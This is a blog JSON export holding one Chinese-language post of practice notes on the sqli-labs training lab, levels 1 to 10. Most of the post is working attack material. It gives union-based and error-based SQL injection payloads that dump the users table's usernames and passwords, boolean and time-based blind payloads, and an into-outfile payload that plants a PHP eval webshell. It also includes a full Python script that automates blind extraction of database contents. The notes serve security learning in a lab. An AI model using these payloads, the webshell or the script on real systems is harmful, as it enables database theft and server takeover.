{"meta":{"title":"Blog","subtitle":null,"description":"无我梦中","author":"虾米","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"","slug":"sqli-labs实战笔记","date":"2019-03-28T08:48:14.030Z","updated":"2019-03-28T11:28:00.107Z","comments":true,"path":"2019/03/28/sqli-labs实战笔记/","link":"","permalink":"http://yoursite.com/2019/03/28/sqli-labs实战笔记/","excerpt":"","text":"实验环境php5.5+apache+MySQL ####less-1 联合查询注入 输入单引号，页面报错，接着使用and &#39;1&#39;=&#39;1和and &#39;1&#39;=&#39;2 ,一个返回正常，一个报错，由报错结果可知，是字符型输入，大致语句应为select..from..where id=&#39;$id&#39;.. order by 判断数据列，order by 3时正常显示，order by 4时报错，所以应有3列数据（图2），此处的--+是用来注释后面的语句，+在url中可被解析为空格，即变为--，也可用%23代替#来进行注释。 此时用union select 1,2,3联合查询语句看页面是否有回显，如果没有变化可以试着将 id 改为一个数据库不存在的值，此处改为 0 后发现页面有回显。（图3） 然后开始爆库、表、列、字段，语句如下： 1. union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 发现有 users表，应该比较有价值 2. union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; 3. union select 1,group_concat(username,0x3a,password),3 from users--+ 这里由于可能有多个名，所以用group_concat将其连接一起显示。（图4） 一般流程： order by判断字段数(假设3个) select null,database(),null 得库名 select null,table_name,null from information_schema.tables where table_schema=&#39;库名&#39; limit 0,1爆表名 select null,column_name,null from information_schema.columns where table_name=&#39;数据表名&#39; limit 0,1列名 select null,列名,null from 库名.表名 where table_name=&#39;表名&#39; limit 0,1得字段 group_concat超过位数可用limit逐条显示 手工报错型注入 1. id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+–爆表 2. id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+ 3. id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;us&#39;)))) --+ 4. and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;us&#39;,&#39;user&#39;,&#39;password&#39;,&#39;avatar&#39;,&#39;last_login&#39;)))) --+–爆列 5. id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+ 6. id=1&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;I-kill-you&#39;))))--+–爆值 ####less-2与less-1类似加单引号后，发现比less-1少near &#39;&#39;1，猜测 id 未加符号，用and 1=1和and 1=2测试，确为数字型注入，接下来的步骤即同上，payload去掉单引号即可。(图5) ####less-3仍旧是单引号测试，看到select语句中包含&#39;&#39;1&#39;&#39;)limit 0,1，可推测id值被单引号和括号一起包含。可用and验证。（图6） ####less-4单引号未返回错误，输入双引号尝试，返回错误。推测id值被一对双引号和括号包含（图7） ####less-5双注入单引号字符型注入(select嵌套select)输入id=1，无回显，输入id=1&#39;有错误回显，与less-1类似，但是没有信息输出。要运用基于错误的SQL语句：（还可用布尔型和时间延迟型）三种类型： 通过floor报错：and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)其中payload要插入的SQL语句该语句将输出字符长度限制为64个字符 通过updatexml报错：and updatexml(1,payload,1)同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效 通过ExtractValue报错：and extractvalue(1, payload)输出字符有长度限制，最长32位。payload即我们要输入的sql查询语句 此处用floorpayload： 1. id=1&#39; and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 2. and (select 1 from (select count(*),concat(((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 函数说明： count():统计元组个数 rand():返回一个0~1之间的随机数 floor():向下取整 ####less-6less-5的基础上将单引号变为双引号。 ####less-7导出文件字符型注入file权限：数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限函数说明: outile：在MySQL中将表的内容导出为一个文本文件，语法格式为:select[column_name] from table [where] into outfile &#39;目标文件&#39;[option] dumpfile：将表的内容导出为一个文件，但一次导出一行，故在outfile基础上加limit load_file：将数据导入MySQL 语句测试：先推测含有单引号，用and 1=1测试发现出错，所以再进行尝试，发现原SQL语句由一对单引号和两对括号包含。再用order by判断字段数。接下来进行权限测试，语句如下：and (select count(*) from mysql.user)&gt;0 --+，结果正常即有权限。确定有权限后用outfile:union select 1,2,3 into outfile &quot;目录&quot; --+注：文件路径中要用\\\\代替\\ 还可以写入一句话木马一起利用：?id=-1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;&quot;,3 into outfile &quot;路径\\\\123456.php&quot; --+ ####less-8基于布尔型单引号盲注，时间或者file好像都可以函数说明：length()：返回字符串的长度substr()：将第一个参数即字符串从第二个参数的位置开始截取第三个参数的长度的字符进行返回（这里第二个参数的位置是从1开始的而不是0）mid():跟substr函数一样，截取字符串ascii()：返回字符串的第一个字符的ASCII值ord():同上，返回ASCII码盲注只有两种返回界面，正常返回和无回显 and ascii(substr((select database()),1,1))&gt;110 --+可以用二分法提高效率由于盲注非常耗费时间，所以可以用工具sqlmap等跑或者写脚本，在网上找了一个现成的贴一下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175#!/usr/bin/python#coding=utf-8import urllib url = &quot;http://localhost/sqli/Less-8/?id=1&quot;success_text = &quot;You are in...........&quot; #定义相应的SQL注入语句ascii_fuzz = &quot;&apos; and ascii(substr((%s),%d,1))&gt;=%d #&quot;length_fuzz = &quot;&apos; and length(%s) &gt;= %d #&quot;DB_fuzz = &quot;select database()&quot;table_fuzz = &quot;select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1&quot;column_fuzz = &quot;select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %d,1&quot;data_fuzz = &quot;select %s from %s limit %d,1&quot; tablecount_fuzz = &quot;&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)&gt;=%d #&quot;columncount_fuzz1 = &quot;&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;&quot;columncount_fuzz2 = &quot;&apos; and table_name=&apos;%s&apos;)&gt;=%d #&quot;datacount_fuzz = &quot;&apos; and (select count(*) from %s)&gt;=%d #&quot; tablelength_fuzz1 = &quot;&apos;and (select length(table_name) from information_schema.tables where table_schema=&apos;%s&apos; limit &quot;tablelength_fuzz2 = &quot;,1)&gt;=%d #&quot;columnlength_fuzz1 = &quot;&apos; and (select length(column_name) from information_schema.columns where table_schema=&apos;&quot;columnlength_fuzz2 = &quot;&apos; and table_name=&apos;%s&apos; limit &quot;columnlength_fuzz3 = &quot;,1)&gt;=%d #&quot;datalength_fuzz1 = &quot;&apos; and (select length(&quot;datalength_fuzz2 = &quot;) from %s limit &quot;datalength_fuzz3 = &quot;,1)&gt;=%d #&quot; #SQL盲注测试函数def Bind_SQL_Fuzz(): #获取数据库名的长度 DBnamelength = getLength(length_fuzz,&quot;database()&quot;) DBname = getName(ascii_fuzz,DB_fuzz,DBnamelength) print &quot;[*] The database is: &quot; + DBname print #获取表的数量 tablecount = getLength(tablecount_fuzz,DBname) print &quot;[*] The count of tables is: &quot; + str(tablecount) #获取各个表名 for i in xrange(0,tablecount): tablelength_fuzz_new = tablelength_fuzz1 + str(i) + tablelength_fuzz2 tablelength = getLength(tablelength_fuzz_new,DBname) tname = getName(ascii_fuzz,table_fuzz%(DBname,i),tablelength) print &apos;[Table Name] &apos; + tname print #获取users表的列数 columncount_fuzz_new = columncount_fuzz1 + DBname + columncount_fuzz2 columncount = getLength(columncount_fuzz_new,&quot;users&quot;) print &quot;[*] (Table: users) The count of columns is: &quot; + str(columncount) #定义两个数组分别用于存储列名和列中对应的信息 col = [] Datas = [] #获取数据一共有多少列 datacount = getLength(datacount_fuzz,&quot;users&quot;) #获取users表的列名 for i in xrange(0,columncount): columnlength_fuzz_new = columnlength_fuzz1 + DBname + columnlength_fuzz2 + str(i) + columnlength_fuzz3 columnlength = getLength(columnlength_fuzz_new,&quot;users&quot;) cname = getName(ascii_fuzz,column_fuzz%(DBname,&quot;users&quot;,i),columnlength) print &quot;[Column Name] (Table: users) &quot; + cname col.append(cname) #获取列名对应的数据信息 datas = [] for x in xrange(0,datacount): datalength_fuzz_new = datalength_fuzz1 + cname + datalength_fuzz2 + str(x) + datalength_fuzz3 datalength = getLength(datalength_fuzz_new,&quot;users&quot;) data = getName(ascii_fuzz,data_fuzz%(cname,&quot;users&quot;,x),datalength) datas.append(data) Datas.append(datas) print print &quot;[*] (Table: users) The count of data is: &quot; + str(datacount) print print &quot;[*] The data of users: &quot; #输出列名 colname = &quot;&quot; for i in range(0,len(col)): if i == 0: colname += col[i] else: colname += &quot; &quot; + col[i] print colname #输出users表中的具体信息 show = &quot;&quot; for i in xrange(0,datacount): show = &quot;%-8s%-16s%-16s&quot; print show%(Datas[0][i],Datas[1][i],Datas[2][i]) #获取字段的长度def getLength(text,string): left = 0 right = 0 guess = 10 while True: #如果返回为真，那么guess加5直至返回为假时确定右边界 if Check1(text,string,guess) == True: guess += 5 else: right = guess break #二分查找法 mid = (left + right) / 2 while left &lt; right - 1: if Check1(text,string,mid) == True: left = mid else: right = mid mid = (left + right) / 2 return left #检测请求SQL注入的URL是否注入成功def Check1(text,string,length): newurl = url + urllib.quote(text % (string,length)) result = urllib.urlopen(newurl) if success_text in result.read(): return True else: return False #与check1类似，但接收的参数值数量不同def Check2(text,string,position,num): newurl = url + urllib.quote(text % (string,position,num)) result = urllib.urlopen(newurl) if success_text in result.read(): return True else: return False #获取相应字段的名称def getName(text,string,length): name = &apos;&apos; for i in xrange(1,length+1): #32是空格，为第一个可显示的字符，127是delete，即最后一个可显示的字符 left = 32 right = 127 #二分查找法 mid = (left + right) / 2 while left &lt; right - 1: if Check2(text,string,i,mid) == True: left = mid mid = (left + right) / 2 else: right = mid mid = (left + right) / 2 name += chr(left) return name def main(): Bind_SQL_Fuzz() if __name__ == &apos;__main__&apos;: main() ####less-9基于时间的单引号字符盲注尝试使用单引号和双引号闭合，发现页面回显一直正常。判断是时间注入。id=1&#39; and if(ascii(substr((select database()),1,1))&gt;115,0,sleep(5)) --+ ####less-10less-9换成双引号。","categories":[],"tags":[]}]}